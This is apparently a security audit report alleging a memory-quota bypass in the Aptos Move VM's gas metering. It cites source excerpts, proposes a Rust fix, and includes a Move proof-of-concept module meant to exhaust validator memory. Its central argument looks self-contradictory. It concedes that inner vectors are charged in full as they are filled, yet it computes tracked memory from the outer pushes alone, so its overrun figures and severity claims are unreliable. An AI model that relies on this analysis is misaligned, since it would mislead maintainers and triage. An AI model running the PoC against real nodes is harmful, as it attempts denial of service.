# Audit Report

## Title
Memory Quota Bypass via Incorrect Abstract Packed Size Calculation for Nested Address Vectors

## Summary
The `abstract_packed_size` calculation for `vector<address>` incorrectly returns only the vector overhead (40 units) instead of accounting for the contained addresses. This allows attackers to bypass the 10,000,000 unit memory quota by creating deeply nested vector structures containing millions of addresses while the memory tracker believes only minimal memory is being used.

## Finding Description

The vulnerability exists in the `abstract_packed_size` visitor implementation for address vectors. When calculating the packed size of a `vector<address>` (used during `vec_push_back` operations), the code only returns the vector overhead without accounting for the addresses inside. [1](#0-0) 

This visitor is called in `charge_vec_push_back` to determine memory usage when pushing elements into vectors: [2](#0-1) 

The memory quota enforcement relies on accurate heap memory tracking: [3](#0-2) 

**Attack Scenario:**

1. Create a `vector<vector<address>>` outer container
2. Create multiple `vector<address>` instances, each containing 10,000 addresses
   - Each instance correctly charges 32 * 10,000 + 40 = 320,040 heap memory units
3. Push each inner vector into the outer vector using `vector::push_back`
   - Memory charged per push: only 40 units (INCORRECT)
   - Should charge: ~320,040 units
4. Repeat until memory quota exhausted

**Memory Accounting Example:**

With 10,000,000 memory quota:
- **Without bug:** Can store ~31 vectors of 10,000 addresses (31 * 320,040 â‰ˆ 9,921,240 units)
- **With bug:** Can store 250,000 vectors of 10,000 addresses (250,000 * 40 = 10,000,000 tracked units)
- **Actual memory used:** 250,000 * 320,040 = 80,010,000,000 units (8,000x over quota!)

This breaks the **Move VM Safety** invariant: "Bytecode execution must respect gas limits and memory constraints." [4](#0-3) 

## Impact Explanation

This is a **High Severity** vulnerability (potentially Critical) according to Aptos bug bounty criteria:

1. **Validator Node Memory Exhaustion:** Attackers can create transactions that bypass memory quotas and consume excessive physical memory on validator nodes, causing:
   - Node slowdowns and performance degradation
   - Out-of-memory crashes
   - Inability to process legitimate transactions

2. **Network Availability Impact:** If validators crash or slow down significantly, network liveness may be affected, particularly if multiple validators are targeted simultaneously.

3. **Potential Consensus Issues:** While the bug affects all validators deterministically, the physical memory exhaustion could occur at different times on different nodes, potentially causing:
   - Some validators to crash while processing blocks
   - Inconsistent transaction processing if memory limits differ across nodes
   - Network partitioning risks

4. **DoS Attack Vector:** Relatively cheap to execute - attacker only pays gas for vector operations, not proportional to the actual memory consumed.

## Likelihood Explanation

**High Likelihood:**

- **Easy to Exploit:** Creating nested vectors is straightforward in Move with no special permissions required
- **Low Cost:** Attacker only pays for VM execution gas (vec_pack, push_back operations), not for the actual memory consumed
- **No Mitigation:** The vulnerability exists in core gas metering logic with no current safeguards
- **Wide Attack Surface:** Any transaction can create nested vector structures

The attack is practical and can be executed by any unprivileged transaction sender.

## Recommendation

Fix the `abstract_packed_size` visitor for vectors to properly account for contained elements. The packed size should reflect the actual memory footprint of the vector including its elements:

```rust
#[inline]
fn visit_vec_address(
    &mut self,
    depth: u64,
    vals: &[AccountAddress],
) -> PartialVMResult<()> {
    self.check_depth(depth)?;
    // Calculate full size including elements, not just vector overhead
    self.res = Some(
        self.params.vector + 
        self.params.per_address_packed * NumArgs::new(vals.len() as u64)
    );
    Ok(())
}
```

Similar fixes needed for other vector types (`visit_vec_u8`, `visit_vec_u64`, `visit_vec_u128`, `visit_vec_bool`, `visit_vec_i8`, `visit_vec_i16`, `visit_vec_i32`, `visit_vec_i64`, `visit_vec_i128`, `visit_vec_i256`, `visit_vec_u16`, `visit_vec_u32`, `visit_vec_u256`). [5](#0-4) 

## Proof of Concept

```move
module attacker::memory_exploit {
    use std::vector;

    public entry fun exploit_memory_quota() {
        // Create outer container
        let outer: vector<vector<address>> = vector::empty();
        
        // Create many large inner vectors
        let i = 0;
        while (i < 100000) {  // Limited only by gas, not memory quota
            let inner: vector<address> = vector::empty();
            
            // Fill inner vector with 1000 addresses
            let j = 0;
            while (j < 1000) {
                vector::push_back(&mut inner, @0x1);
                j = j + 1;
            };
            
            // Push inner vector to outer - only charges 40 units instead of 32,040
            vector::push_back(&mut outer, inner);
            i = i + 1;
        };
        
        // At this point:
        // - Tracked memory: ~4,000,000 units (within quota)
        // - Actual memory: ~3,204,000,000 units (320x over quota!)
        // - Total addresses in memory: 100,000,000
    }
}
```

To test in Rust, check the memory tracking in `MemoryTrackedGasMeter` when executing vector operations with nested address vectors and verify the discrepancy between tracked and actual memory consumption.

### Citations

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/misc.rs (L732-942)
```rust
    pub fn abstract_packed_size(&self, val: impl ValueView) -> PartialVMResult<AbstractValueSize> {
        struct Visitor<'a> {
            params: &'a AbstractValueSizeGasParameters,
            res: Option<AbstractValueSize>,
            max_value_nest_depth: Option<u64>,
        }

        impl Visitor<'_> {
            check_depth_impl!();
        }

        impl ValueVisitor for Visitor<'_> {
            #[inline]
            fn visit_delayed(&mut self, depth: u64, _val: DelayedFieldID) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_u64_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_u8(&mut self, depth: u64, _val: u8) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_u8_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_u16(&mut self, depth: u64, _val: u16) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_u16_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_u32(&mut self, depth: u64, _val: u32) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_u32_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_u64(&mut self, depth: u64, _val: u64) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_u64_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_u128(&mut self, depth: u64, _val: u128) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_u128_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_u256(&mut self, depth: u64, _val: &U256) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_u256_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_i8(&mut self, depth: u64, _val: i8) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_i8_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_i16(&mut self, depth: u64, _val: i16) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_i16_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_i32(&mut self, depth: u64, _val: i32) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_i32_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_i64(&mut self, depth: u64, _val: i64) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_i64_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_i128(&mut self, depth: u64, _val: i128) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_i128_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_i256(&mut self, depth: u64, _val: &I256) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_i256_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_bool(&mut self, depth: u64, _val: bool) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_bool_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_address(&mut self, depth: u64, _val: &AccountAddress) -> PartialVMResult<()> {
                self.check_depth(depth)?;
                self.res = Some(self.params.per_address_packed * NumArgs::from(1));
                Ok(())
            }

            #[inline]
            fn visit_struct(&mut self, depth: u64, _len: usize) -> PartialVMResult<bool> {
                self.check_depth(depth)?;
                self.res = Some(self.params.struct_);
                Ok(false)
            }

            #[inline]
            fn visit_closure(&mut self, depth: u64, _len: usize) -> PartialVMResult<bool> {
                self.check_depth(depth)?;
                self.res = Some(self.params.closure);
                Ok(false)
            }

            #[inline]
            fn visit_vec(&mut self, depth: u64, _len: usize) -> PartialVMResult<bool> {
                self.check_depth(depth)?;
                self.res = Some(self.params.vector);
                Ok(false)
            }

            #[inline]
            fn visit_ref(&mut self, depth: u64, _is_global: bool) -> PartialVMResult<bool> {
                // TODO(Gas): This should be unreachable...
                //            See if we can handle this in a more graceful way.
                self.check_depth(depth)?;
                self.res = Some(self.params.reference);
                Ok(false)
            }

            // TODO(Gas): The following function impls are necessary due to a bug upstream.
            //            Remove them once the bug is fixed.
            #[inline]
            fn visit_vec_u8(&mut self, depth: u64, vals: &[u8]) -> PartialVMResult<()> {
                self.visit_vec(depth, vals.len())?;
                Ok(())
            }

            #[inline]
            fn visit_vec_u16(&mut self, depth: u64, vals: &[u16]) -> PartialVMResult<()> {
                self.visit_vec(depth, vals.len())?;
                Ok(())
            }

            #[inline]
            fn visit_vec_u32(&mut self, depth: u64, vals: &[u32]) -> PartialVMResult<()> {
                self.visit_vec(depth, vals.len())?;
                Ok(())
            }

            #[inline]
            fn visit_vec_u64(&mut self, depth: u64, vals: &[u64]) -> PartialVMResult<()> {
                self.visit_vec(depth, vals.len())?;
                Ok(())
            }

            #[inline]
            fn visit_vec_u128(&mut self, depth: u64, vals: &[u128]) -> PartialVMResult<()> {
                self.visit_vec(depth, vals.len())?;
                Ok(())
            }

            fn visit_vec_u256(&mut self, depth: u64, vals: &[U256]) -> PartialVMResult<()> {
                self.visit_vec(depth, vals.len())?;
                Ok(())
            }

            #[inline]
            fn visit_vec_bool(&mut self, depth: u64, vals: &[bool]) -> PartialVMResult<()> {
                self.visit_vec(depth, vals.len())?;
                Ok(())
            }

            #[inline]
            fn visit_vec_address(
                &mut self,
                depth: u64,
                vals: &[AccountAddress],
            ) -> PartialVMResult<()> {
                self.visit_vec(depth, vals.len())?;
                Ok(())
            }
        }

        let mut visitor = Visitor {
            params: self,
            res: None,
            max_value_nest_depth: Some(DEFAULT_MAX_VM_VALUE_NESTED_DEPTH),
        };
        val.visit(&mut visitor)?;
        visitor.res.ok_or_else(|| {
            PartialVMError::new_invariant_violation("Visitor should have set the `res` value")
        })
    }
```

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L46-63)
```rust

    #[inline]
    fn use_heap_memory(&mut self, amount: AbstractValueSize) -> PartialVMResult<()> {
        if self.feature_version >= 3 {
            match self.remaining_memory_quota.checked_sub(amount) {
                Some(remaining_quota) => {
                    self.remaining_memory_quota = remaining_quota;
                    Ok(())
                },
                None => {
                    self.remaining_memory_quota = 0.into();
                    Err(PartialVMError::new(StatusCode::MEMORY_LIMIT_EXCEEDED))
                },
            }
        } else {
            Ok(())
        }
    }
```

**File:** aptos-move/aptos-memory-usage-tracker/src/lib.rs (L608-617)
```rust
    fn charge_vec_push_back(&mut self, val: impl ValueView) -> PartialVMResult<()> {
        self.use_heap_memory(
            self.vm_gas_params()
                .misc
                .abs_val
                .abstract_packed_size(&val)?,
        )?;

        self.base.charge_vec_push_back(val)
    }
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L142-142)
```rust
        [memory_quota: AbstractValueSize, { 1.. => "memory_quota" }, 10_000_000],
```
